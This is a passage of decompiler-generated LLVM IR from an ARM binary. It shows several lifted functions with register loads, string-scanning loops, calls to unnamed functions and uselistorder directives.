  %v2_14960 = inttoptr i32 %v1_14960 to i32*
  %v3_14960 = load i32, i32* %v2_14960, align 4
  store i32 %v3_14960, i32* %r0.global-to-local, align 4
  store i32 %v3_147b4, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_14960, i32* %v2_1496c, align 4
  %v0_14970 = load i32, i32* @fp, align 4
  %v2_14974 = inttoptr i32 %v3_14960 to i8*
  %v3_14974 = call i32 @function_11790(i8* %v2_14974, i32 %v0_14970)
  store i32 %v3_14974, i32* %r0.global-to-local, align 4
  store i32 %v1_147c8, i32* %r2.global-to-local, align 4
  store i1 %v2_1497c, i1* %cpsr_z.global-to-local, align 1
  %v0_14980 = load i32, i32* @r5, align 4
  %v1_14980 = add i32 %v0_14980, 12
  %v2_14980 = inttoptr i32 %v1_14980 to i32*
  %v3_14980 = load i32, i32* %v2_14980, align 4
  store i32 %v3_14980, i32* @r4, align 4
  br i1 %v2_1497c, label %dec_label_pc_14998, label %dec_label_pc_14988

dec_label_pc_14988:                               ; preds = %dec_label_pc_14960
  store i32 %v3_14980, i32* @r0, align 4
  %v0_1498c = load i32, i32* @sl, align 4
  %v2_14990 = inttoptr i32 %v3_14980 to i8*
  %v3_14990 = call i32 @function_15e04(i8* %v2_14990, i32 %v0_1498c)
  store i32 %v3_14990, i32* %r0.global-to-local, align 4
  %v0_14994 = load i32, i32* @r4, align 4
  %v2_14994 = add i32 %v0_14994, %v3_14990
  store i32 %v2_14994, i32* @r4, align 4
  br label %dec_label_pc_14998

dec_label_pc_14998:                               ; preds = %dec_label_pc_14960, %dec_label_pc_14988
  %v0_14a7013 = phi i32 [ %v3_14980, %dec_label_pc_14960 ], [ %v2_14994, %dec_label_pc_14988 ]
  %v1_14998 = inttoptr i32 %v0_14a7013 to i8*
  %v2_14998 = load i8, i8* %v1_14998, align 1
  %v3_14998 = zext i8 %v2_14998 to i32
  store i32 %v3_14998, i32* %r2.global-to-local, align 4
  %v2_1499c = icmp eq i8 %v2_14998, 0
  store i1 %v2_1499c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1499c, label %dec_label_pc_147f0.backedge, label %dec_label_pc_149a4

dec_label_pc_147f0.backedge:                      ; preds = %dec_label_pc_14998, %dec_label_pc_14a98, %dec_label_pc_149a4
  %v0_147f0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_147f0

dec_label_pc_149a4:                               ; preds = %dec_label_pc_14998
  %v0_149a4 = load i32, i32* @r7, align 4
  %v1_149a4 = inttoptr i32 %v0_149a4 to i8*
  %v2_149a4 = load i8, i8* %v1_149a4, align 1
  %v3_149a4 = zext i8 %v2_149a4 to i32
  store i32 %v3_149a4, i32* %r3.global-to-local, align 4
  %v9_149a8 = icmp eq i8 %v2_149a4, %v2_14998
  store i1 %v9_149a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_149a8, label %dec_label_pc_147f0.backedge, label %dec_label_pc_14a70.preheader

dec_label_pc_14a70.preheader:                     ; preds = %dec_label_pc_149a4
  %v1_149ac = load i32, i32* @fp, align 4
  store i32 %v1_149ac, i32* @r6, align 4
  %v2_14a7015 = load i8, i8* %v1_14998, align 1
  %v3_14a7016 = zext i8 %v2_14a7015 to i32
  store i32 %v3_14a7016, i32* %r2.global-to-local, align 4
  %v2_14a7417 = icmp eq i8 %v2_14a7015, 0
  store i1 %v2_14a7417, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14a7417, label %dec_label_pc_14a8c, label %dec_label_pc_14a7c.preheader

dec_label_pc_14a7c.preheader:                     ; preds = %dec_label_pc_14a70.preheader
  %v2_14a7c82 = load i8, i8* %v1_149a4, align 1
  %v3_14a7c83 = zext i8 %v2_14a7c82 to i32
  store i32 %v3_14a7c83, i32* %r3.global-to-local, align 4
  %v9_14a8086 = icmp eq i8 %v2_14a7c82, %v2_14a7015
  store i1 %v9_14a8086, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14a8086, label %dec_label_pc_14a8c, label %bb74

dec_label_pc_149b8:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_149bc = load i32, i32* %v2_1496c, align 4
  store i32 %v2_149bc, i32* %r3.global-to-local, align 4
  store i32 %v1_147cc, i32* %r2.global-to-local, align 4
  %v9_149c4 = icmp eq i32 %v2_149c888, %v1_147cc
  store i1 %v9_149c4, i1* %cpsr_z.global-to-local, align 1
  %v5_149c8 = mul i32 %v2_149c888, 4
  %v6_149c8 = add i32 %v2_149bc, %v5_149c8
  %v7_149c8 = inttoptr i32 %v6_149c8 to i32*
  store i32 %v0_149c887, i32* %v7_149c8, align 4
  br i1 %v9_149c4, label %dec_label_pc_149d0, label %dec_label_pc_149dc

dec_label_pc_149d0:                               ; preds = %dec_label_pc_149b8
  store i32 %v1_147d8, i32* %r3.global-to-local, align 4
  store i1 %v2_149d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_149d4, label %dec_label_pc_149dc, label %dec_label_pc_149fc

dec_label_pc_149dc:                               ; preds = %dec_label_pc_149d0, %dec_label_pc_149b8
  %v0_149dc = load i32, i32* @r7, align 4
  %v1_149dc = inttoptr i32 %v0_149dc to i8*
  %v2_149dc = load i8, i8* %v1_149dc, align 1
  %v3_149dc = zext i8 %v2_149dc to i32
  store i32 %v3_149dc, i32* %r3.global-to-local, align 4
  %v2_149e0 = icmp eq i8 %v2_149dc, 0
  store i1 %v2_149e0, i1* %cpsr_z.global-to-local, align 1
  %v0_149e4 = load i32, i32* @r4, align 4
  store i32 %v0_149e4, i32* @r0, align 4
  %v1_149e8 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_149e0, i32 %v1_149e8, i32 %v0_149dc
  store i32 %storemerge, i32* @r1, align 4
  %v0_149f0 = call i32 @function_15dc0()
  store i32 %v0_149f0, i32* %r0.global-to-local, align 4
  %v0_149f4 = load i32, i32* @r4, align 4
  %v2_149f4 = add i32 %v0_149f4, %v0_149f0
  store i32 %v2_149f4, i32* @r4, align 4
  br label %dec_label_pc_14a34

dec_label_pc_149fc:                               ; preds = %dec_label_pc_149d0
  %v0_149fc = load i32, i32* @r4, align 4
  store i32 %v0_149fc, i32* @r0, align 4
  %v0_14a00 = load i32, i32* @r7, align 4
  %v1_14a00 = inttoptr i32 %v0_14a00 to i8*
  %v2_14a00 = load i8, i8* %v1_14a00, align 1
  %v3_14a00 = zext i8 %v2_14a00 to i32
  %v5_14a04 = call i32 @function_15ea0(i32 %v0_149fc, i32 %v3_14a00, i32 %v1_147cc, i32 %v1_147d8)
  store i32 %v5_14a04, i32* %r0.global-to-local, align 4
  store i32 %v1_147c8, i32* %r2.global-to-local, align 4
  store i1 %v2_1497c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_14a04, i32* @r4, align 4
  br i1 %v2_1497c, label %dec_label_pc_14a34, label %dec_label_pc_14a20

dec_label_pc_14a1c:                               ; preds = %dec_label_pc_14a20
  %v1_14a1c = add i32 %v0_14a34.pre, -1
  store i32 %v1_14a1c, i32* @r4, align 4
  br label %dec_label_pc_14a20

dec_label_pc_14a20:                               ; preds = %dec_label_pc_149fc, %dec_label_pc_14a1c
  %v0_14a20 = phi i32 [ %v1_14a1c, %dec_label_pc_14a1c ], [ %v5_14a04, %dec_label_pc_149fc ]
  %v1_14a20 = add i32 %v0_14a20, -1
  %v2_14a20 = inttoptr i32 %v1_14a20 to i8*
  %v3_14a20 = load i8, i8* %v2_14a20, align 1
  %v4_14a20 = zext i8 %v3_14a20 to i32
  %v0_14a24 = load i32, i32* @sl, align 4
  store i32 %v0_14a24, i32* @r0, align 4
  %v2_14a28 = call i32 @function_15f8c(i32 %v0_14a24, i32 %v4_14a20)
  store i32 %v2_14a28, i32* %r0.global-to-local, align 4
  %v2_14a2c = icmp eq i32 %v2_14a28, 0
  store i1 %v2_14a2c, i1* %cpsr_z.global-to-local, align 1
  %v0_14a34.pre = load i32, i32* @r4, align 4
  br i1 %v2_14a2c, label %dec_label_pc_14a34, label %dec_label_pc_14a1c

dec_label_pc_14a34:                               ; preds = %dec_label_pc_14a20, %dec_label_pc_149fc, %dec_label_pc_149dc
  %v3_14a40 = phi i32 [ %v5_14a04, %dec_label_pc_149fc ], [ %v2_149f4, %dec_label_pc_149dc ], [ %v0_14a34.pre, %dec_label_pc_14a20 ]
  %v1_14a34 = inttoptr i32 %v3_14a40 to i8*
  %v2_14a34 = load i8, i8* %v1_14a34, align 1
  %v3_14a34 = zext i8 %v2_14a34 to i32
  store i32 %v3_14a34, i32* %r2.global-to-local, align 4
  %v0_14a38 = load i32, i32* @r7, align 4
  %v1_14a38 = inttoptr i32 %v0_14a38 to i8*
  %v2_14a38 = load i8, i8* %v1_14a38, align 1
  %v3_14a38 = zext i8 %v2_14a38 to i32
  store i32 %v3_14a38, i32* %r3.global-to-local, align 4
  %v9_14a3c = icmp eq i8 %v2_14a38, %v2_14a34
  store i1 %v9_14a3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14a3c, label %bb71, label %dec_label_pc_14a48

bb71:                                             ; preds = %dec_label_pc_14a34
  %v1_14a40 = load i32, i32* @fp, align 4
  %v2_14a40 = trunc i32 %v1_14a40 to i8
  store i8 %v2_14a40, i8* %v1_14a34, align 1
  %v0_14a44.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14a44.pr, label %bb73, label %.dec_label_pc_14a48_crit_edge

.dec_label_pc_14a48_crit_edge:                    ; preds = %bb71
  %v0_14a48.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14a48

dec_label_pc_14a48:                               ; preds = %.dec_label_pc_14a48_crit_edge, %dec_label_pc_14a34
  %v0_14a48 = phi i32 [ %v0_14a48.pre, %.dec_label_pc_14a48_crit_edge ], [ %v3_14a34, %dec_label_pc_14a34 ]
  %v2_14a48 = icmp eq i32 %v0_14a48, 0
  store i1 %v2_14a48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14a48, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_14a48
  %v1_14a4c = load i32, i32* @fp, align 4
  %v2_14a4c = trunc i32 %v1_14a4c to i8
  %v3_14a4c = load i32, i32* @r4, align 4
  %v4_14a4c = inttoptr i32 %v3_14a4c to i8*
  store i8 %v2_14a4c, i8* %v4_14a4c, align 1
  %v5_14a4c = load i32, i32* @r4, align 4
  %v6_14a4c = add i32 %v5_14a4c, 1
  store i32 %v6_14a4c, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_14a48, %bb72
  %v2_14a50 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_14a50, i32* %r3.global-to-local, align 4
  %v2_14a54 = icmp eq i32 %v2_14a50, 0
  store i1 %v2_14a54, i1* %cpsr_z.global-to-local, align 1
  %v0_14a70.pre = load i32, i32* @r4, align 4
  br i1 %v2_14a54, label %dec_label_pc_14a6c, label %dec_label_pc_14a5c

dec_label_pc_14a5c:                               ; preds = %bb73
  store i32 %v0_14a70.pre, i32* @r0, align 4
  %v0_14a60 = load i32, i32* @sl, align 4
  %v2_14a64 = inttoptr i32 %v0_14a70.pre to i8*
  %v3_14a64 = call i32 @function_15e04(i8* %v2_14a64, i32 %v0_14a60)
  store i32 %v3_14a64, i32* %r0.global-to-local, align 4
  %v0_14a68 = load i32, i32* @r4, align 4
  %v2_14a68 = add i32 %v0_14a68, %v3_14a64
  store i32 %v2_14a68, i32* @r4, align 4
  br label %dec_label_pc_14a6c

dec_label_pc_14a6c:                               ; preds = %bb73, %dec_label_pc_14a5c
  %v0_14a70 = phi i32 [ %v2_14a68, %dec_label_pc_14a5c ], [ %v0_14a70.pre, %bb73 ]
  %v0_14a6c = load i32, i32* @r6, align 4
  %v1_14a6c = add i32 %v0_14a6c, 1
  store i32 %v1_14a6c, i32* @r6, align 4
  %v1_14a70 = inttoptr i32 %v0_14a70 to i8*
  %v2_14a70 = load i8, i8* %v1_14a70, align 1
  %v3_14a70 = zext i8 %v2_14a70 to i32
  store i32 %v3_14a70, i32* %r2.global-to-local, align 4
  %v2_14a74 = icmp eq i8 %v2_14a70, 0
  store i1 %v2_14a74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14a74, label %dec_label_pc_14a8c, label %dec_label_pc_14a6c.dec_label_pc_14a7c_crit_edge

dec_label_pc_14a6c.dec_label_pc_14a7c_crit_edge:  ; preds = %dec_label_pc_14a6c
  %v0_14a7c.pre = load i32, i32* @r7, align 4
  %v1_14a7c = inttoptr i32 %v0_14a7c.pre to i8*
  %v2_14a7c = load i8, i8* %v1_14a7c, align 1
  %v3_14a7c = zext i8 %v2_14a7c to i32
  store i32 %v3_14a7c, i32* %r3.global-to-local, align 4
  %v9_14a80 = icmp eq i8 %v2_14a7c, %v2_14a70
  store i1 %v9_14a80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14a80, label %dec_label_pc_14a8c, label %bb74

bb74:                                             ; preds = %dec_label_pc_14a7c.preheader, %dec_label_pc_14a6c.dec_label_pc_14a7c_crit_edge
  %v2_149c888 = phi i32 [ %v1_14a6c, %dec_label_pc_14a6c.dec_label_pc_14a7c_crit_edge ], [ %v1_149ac, %dec_label_pc_14a7c.preheader ]
  %v0_149c887 = phi i32 [ %v0_14a70, %dec_label_pc_14a6c.dec_label_pc_14a7c_crit_edge ], [ %v0_14a7013, %dec_label_pc_14a7c.preheader ]
  %v2_14a84 = load i32, i32* @sb, align 4
  %v3_14a84 = sub i32 %v2_149c888, %v2_14a84
  %v5_14a84 = xor i32 %v2_14a84, %v2_149c888
  %v6_14a84 = xor i32 %v3_14a84, %v2_149c888
  %v7_14a84 = and i32 %v6_14a84, %v5_14a84
  %v8_14a84 = icmp slt i32 %v7_14a84, 0
  %v9_14a84 = icmp slt i32 %v3_14a84, 0
  %v10_14a84 = icmp eq i32 %v2_149c888, %v2_14a84
  store i1 %v10_14a84, i1* %cpsr_z.global-to-local, align 1
  %v2_14a88 = xor i1 %v9_14a84, %v8_14a84
  br i1 %v2_14a88, label %dec_label_pc_149b8, label %dec_label_pc_14a8c

dec_label_pc_14a8c:                               ; preds = %dec_label_pc_14a7c.preheader, %bb74, %dec_label_pc_14a6c, %dec_label_pc_14a6c.dec_label_pc_14a7c_crit_edge, %dec_label_pc_14a70.preheader
  %v0_14a90 = phi i32 [ %v1_149ac, %dec_label_pc_14a70.preheader ], [ %v1_149ac, %dec_label_pc_14a7c.preheader ], [ %v2_149c888, %bb74 ], [ %v1_14a6c, %dec_label_pc_14a6c ], [ %v1_14a6c, %dec_label_pc_14a6c.dec_label_pc_14a7c_crit_edge ]
  store i32 %v3_147b0, i32* %r2.global-to-local, align 4
  %v9_14a90 = icmp eq i32 %v0_14a90, %v3_147b0
  store i1 %v9_14a90, i1* %cpsr_z.global-to-local, align 1
  %v6_14a94 = icmp slt i32 %v0_14a90, %v3_147b0
  br i1 %v6_14a94, label %dec_label_pc_14a98, label %dec_label_pc_14aa4

dec_label_pc_14a98:                               ; preds = %dec_label_pc_14a8c
  %v0_14a98 = load i32, i32* @r8, align 4
  %v1_14a98 = and i32 %v0_14a98, 1048576
  %v2_14a98 = icmp eq i32 %v1_14a98, 0
  store i1 %v2_14a98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14a98, label %dec_label_pc_147f0.backedge, label %dec_label_pc_14aa0

dec_label_pc_14aa0:                               ; preds = %dec_label_pc_14a98, %dec_label_pc_14958, %.thread, %dec_label_pc_1478c
  br label %dec_label_pc_14aa4

dec_label_pc_14aa4:                               ; preds = %dec_label_pc_14a8c, %dec_label_pc_14874, %dec_label_pc_14aa0
  %v0_14aa4 = phi i32 [ %v0_14884, %dec_label_pc_14874 ], [ 0, %dec_label_pc_14aa0 ], [ %v0_14a90, %dec_label_pc_14a8c ]
  store i32 %v0_14aa4, i32* %r0.global-to-local, align 4
  store i32 %v3_1478c, i32* @r4, align 4
  store i32 %v6_1478c, i32* @r5, align 4
  store i32 %v9_1478c, i32* @r6, align 4
  store i32 %v12_1478c, i32* @r7, align 4
  store i32 %v15_1478c, i32* @r8, align 4
  store i32 %v18_1478c, i32* @sb, align 4
  store i32 %v21_1478c, i32* @sl, align 4
  store i32 %v24_1478c, i32* @fp, align 4
  ret i32 %v0_14aa4

; uselistorder directives
  uselistorder i32 %v0_14aa4, { 1, 0 }
  uselistorder i32 %v0_14a90, { 0, 2, 1 }
  uselistorder i32 %v3_14a84, { 1, 0 }
  uselistorder i32 %v2_14a84, { 1, 0, 2 }
  uselistorder i32 %v2_149c888, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_14a80, { 1, 0 }
  uselistorder i32 %v0_14a70.pre, { 0, 2, 1 }
  uselistorder i32 %v5_14a04, { 1, 0, 2, 3 }
  uselistorder i1 %v9_14a8086, { 1, 0 }
  uselistorder i1 %v9_149a8, { 1, 0 }
  uselistorder i32 %v3_14980, { 0, 2, 1, 3 }
  uselistorder i1 %v7_14958, { 1, 0 }
  uselistorder i1 %v8_14950, { 1, 0 }
  uselistorder i32 %v3_14920, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_14910, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v5_148f8, { 1, 0, 2 }
  uselistorder i32 %v1_148e8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_148d4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_148cc, { 1, 0 }
  uselistorder i32 %v1_148b8, { 1, 0 }
  uselistorder i32 %v1_148b4, { 1, 0 }
  uselistorder i32 %v1_14874, { 2, 0, 1 }
  uselistorder i32 %v0_1485c, { 1, 0 }
  uselistorder i32 %v1_1484c, { 0, 2, 1 }
  uselistorder i1 %v2_1497c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_147d8, { 2, 0, 1, 3 }
  uselistorder i32 %v1_147cc, { 2, 1, 0 }
  uselistorder i32 %v3_147b4, { 1, 0 }
  uselistorder i32 %v3_147b0, { 2, 1, 0 }
  uselistorder i32 %v1_147a8, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 7, 2, 3, 4, 5, 6, 1, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 26, 1, 3, 9, 8, 11, 12, 2, 10, 27, 13, 15, 14, 16, 17, 20, 18, 19, 4, 21, 22, 23, 25, 24, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 13, 14, 15, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 1, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i32 (i32*, i32, i32, i32)* @function_12788, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 92, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 (i32)* @function_15d40, { 1, 0 }
  uselistorder i32* @sl, { 7, 8, 9, 10, 11, 12, 13, 48, 0, 49, 50, 14, 15, 110, 111, 112, 113, 114, 115, 116, 117, 118, 1, 119, 120, 121, 122, 123, 124, 126, 2, 125, 128, 127, 129, 130, 131, 132, 21, 22, 23, 24, 25, 26, 27, 16, 17, 18, 19, 20, 28, 29, 30, 31, 38, 39, 40, 32, 33, 34, 35, 36, 37, 41, 42, 43, 44, 45, 46, 47, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 5, 72, 73, 74, 6, 75, 76, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 3, 94, 95, 96, 97, 4, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 133, 134, 135, 136, 77, 78, 79, 80, 81 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder label %dec_label_pc_14aa4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14a8c, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_14a6c, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14a20, { 1, 0 }
  uselistorder label %dec_label_pc_147f0.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14998, { 1, 0 }
  uselistorder label %dec_label_pc_14958, { 1, 0 }
  uselistorder label %dec_label_pc_1494c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14910, { 1, 0 }
  uselistorder label %dec_label_pc_14844, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @function_14ab4(i32* %arg1) local_unnamed_addr {
dec_label_pc_14ab4:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_14ab8 = icmp eq i32* %arg1, null
  br i1 %v2_14ab8, label %dec_label_pc_14ae0, label %dec_label_pc_14ac0

dec_label_pc_14ac0:                               ; preds = %dec_label_pc_14ab4
  %v2_14ac0 = load i32, i32* %arg1, align 4
  %v1_14ac4 = inttoptr i32 %v2_14ac0 to i16*
  %v2_14ac4 = call i32 @function_14b30(i16* %v1_14ac4)
  %v0_14ac8 = load i32, i32* @r4, align 4
  %v1_14ac8 = add i32 %v0_14ac8, 20
  %v2_14ac8 = inttoptr i32 %v1_14ac8 to i32*
  %v3_14ac8 = load i32, i32* %v2_14ac8, align 4
  %v2_14acc = icmp eq i32 %v3_14ac8, 0
  br i1 %v2_14acc, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_14ac0
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_14ac0, %bb
  store i32 84696, i32* @lr, align 4
  %v1_14ad4 = xor i1 %v2_14acc, true
  call void @__pseudo_cond_branch(i1 %v1_14ad4, i32 ptrtoint (i32* @global_var_12da0.21 to i32))
  %v0_14ad8 = load i32, i32* @r4, align 4
  store i32 %v0_14ad8, i32* @r0, align 4
  %v0_14adc = call i32 @function_12da0()
  br label %dec_label_pc_14ae0

dec_label_pc_14ae0:                               ; preds = %dec_label_pc_14ab4, %bb6
  %v1_14ae4 = phi i32 [ 0, %dec_label_pc_14ab4 ], [ %v0_14adc, %bb6 ]
  ret i32 %v1_14ae4

; uselistorder directives
  uselistorder i32* null, { 0, 5, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 2, 18, 3, 19, 4, 20, 21, 22 }
  uselistorder label %dec_label_pc_14ae0, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_14ae8(i32 %arg1) local_unnamed_addr {
dec_label_pc_14ae8:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14af4 = load i32, i32* @r4, align 4
  store i32 %v3_14af4, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_16930.490 to i32), i32* @r1, align 4
  %v0_14afc = call i32 @function_14ce4()
  store i32 %v0_14afc, i32* %r0.global-to-local, align 4
  store i32 %v0_14afc, i32* @r4, align 4
  %v2_14b00 = icmp eq i32 %v0_14afc, 0
  br i1 %v2_14b00, label %bb, label %dec_label_pc_14b0c

bb:                                               ; preds = %dec_label_pc_14ae8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_14b0c:                               ; preds = %dec_label_pc_14ae8
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_14b14 = call i32 @function_12654(i32 1, i32 24)
  store i32 %v2_14b14, i32* %r0.global-to-local, align 4
  %v2_14b18 = icmp eq i32 %v2_14b14, 0
  br i1 %v2_14b18, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_14b0c
  %v1_14b1c = load i32, i32* @r4, align 4
  %v3_14b1c = inttoptr i32 %v2_14b14 to i32*
  store i32 %v1_14b1c, i32* %v3_14b1c, align 4
  %v1_14b24.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_14b0c, %bb4
  %v1_14b24 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_14b0c ], [ %v1_14b24.pre, %bb4 ]
  %v2_14b20 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14b20, i32* @r4, align 4
  ret i32 %v1_14b24

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 0, 4 }
  uselistorder i32 (i32, i32)* @function_12654, { 35, 6, 41, 40, 39, 38, 37, 36, 20, 19, 34, 33, 29, 28, 27, 26, 25, 24, 23, 22, 21, 5, 18, 17, 16, 4, 3, 2, 15, 14, 13, 12, 11, 10, 9, 8, 7, 1, 0, 32, 31, 30 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @function_14b30(i16* %arg1) local_unnamed_addr {
dec_label_pc_14b30:
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14b30 = load i32, i32* @r4, align 4
  store i32 %v3_14b30, i32* %stack_var_-36, align 4
  %v6_14b30 = load i32, i32* @r5, align 4
  %v9_14b30 = load i32, i32* @r6, align 4
  %v12_14b30 = load i32, i32* @r7, align 4
  %v2_14b34 = add i32 %tmp, 52
  %v3_14b34 = inttoptr i32 %v2_14b34 to i32*
  %v4_14b34 = load i32, i32* %v3_14b34, align 4
  %v1_14b3c = sub i32 1, %v4_14b34
  %v2_14b3c = icmp ult i32 %v4_14b34, 2
  br i1 %v2_14b3c, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_14b30
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_14b30, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_14b3c, %dec_label_pc_14b30 ]
  %v0_14b44 = phi i32 [ 0, %bb ], [ %v1_14b3c, %dec_label_pc_14b30 ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_14b44 = icmp eq i32 %v0_14b44, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 126992, i32* @r6, align 4
  br i1 %v2_14b44, label %dec_label_pc_14b90, label %dec_label_pc_14b58

dec_label_pc_14b58:                               ; preds = %bb18
  %v4_14b70 = load i32, i32* inttoptr (i32 127064 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_14b70)
  %v0_14b84 = load i32, i32* @r6, align 4
  %v2_14b84 = add i32 %v0_14b84, 16
  %v3_14b84 = inttoptr i32 %v2_14b84 to i32*
  %v4_14b84 = load i32, i32* %v3_14b84, align 4
  call void @__pseudo_branch(i32 %v4_14b84)
  %v0_14b90.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14b90

dec_label_pc_14b90:                               ; preds = %bb18, %dec_label_pc_14b58
  %v1_14b98 = phi i32 [ %tmp, %bb18 ], [ %v0_14b90.pre, %dec_label_pc_14b58 ]
  %v1_14b90 = inttoptr i32 %v1_14b98 to i16*
  %v2_14b90 = load i16, i16* %v1_14b90, align 2
  %v3_14b90 = zext i16 %v2_14b90 to i32
  %v1_14b94 = and i32 %v3_14b90, 64
  %v2_14b94 = icmp eq i32 %v1_14b94, 0
  br i1 %v2_14b94, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_14b90
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_14b90, %bb19
  %storemerge26 = phi i32 [ %v1_14b98, %bb19 ], [ %v1_14b94, %dec_label_pc_14b90 ]
  %v1_14b9c = xor i1 %v2_14b94, true
  call void @__pseudo_cond_branch(i1 %v1_14b9c, i32 ptrtoint (i32* @global_var_154cc.495 to i32))
  store i32 %storemerge26, i32* %sl.global-to-local, align 4
  %v0_14ba4 = load i32, i32* @r5, align 4
  %v1_14ba4 = add i32 %v0_14ba4, 4
  %v2_14ba4 = inttoptr i32 %v1_14ba4 to i32*
  %v3_14ba4 = load i32, i32* %v2_14ba4, align 4
  %v1_14ba8 = call i32 @function_1130c(i32 %v3_14ba4)
  %v0_14bb0 = load i32, i32* @r6, align 4
  %v2_14bbc = add i32 %v0_14bb0, 108
  %v3_14bbc = inttoptr i32 %v2_14bbc to i32*
  %v4_14bbc = load i32, i32* %v3_14bbc, align 4
  store i32 %v4_14bbc, i32* @r7, align 4
  %v1_14bc4 = load i32, i32* @r5, align 4
  %v2_14bc4 = add i32 %v1_14bc4, 4
  %v3_14bc4 = inttoptr i32 %v2_14bc4 to i32*
  store i32 -1, i32* %v3_14bc4, align 4
  %v0_14bcc = load i32, i32* @r6, align 4
  %v2_14bcc = add i32 %v0_14bcc, 72
  %v3_14bcc = inttoptr i32 %v2_14bcc to i32*
  %v4_14bcc = load i32, i32* %v3_14bcc, align 4
  %v1_14bd4 = icmp slt i32 %v1_14ba8, 0
  store i32 %v4_14bcc, i32* %stack_var_-80, align 4
  br i1 %v1_14bd4, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  call void @__pseudo_branch(i32 %v4_14bcc)
  %v0_14bfc = load i32, i32* @r6, align 4
  %v2_14bfc = add i32 %v0_14bfc, 16
  %v3_14bfc = inttoptr i32 %v2_14bfc to i32*
  %v4_14bfc = load i32, i32* %v3_14bfc, align 4
  call void @__pseudo_branch(i32 %v4_14bfc)
  %v0_14c0c = load i32, i32* @r6, align 4
  %v2_14c0c = add i32 %v0_14c0c, 12
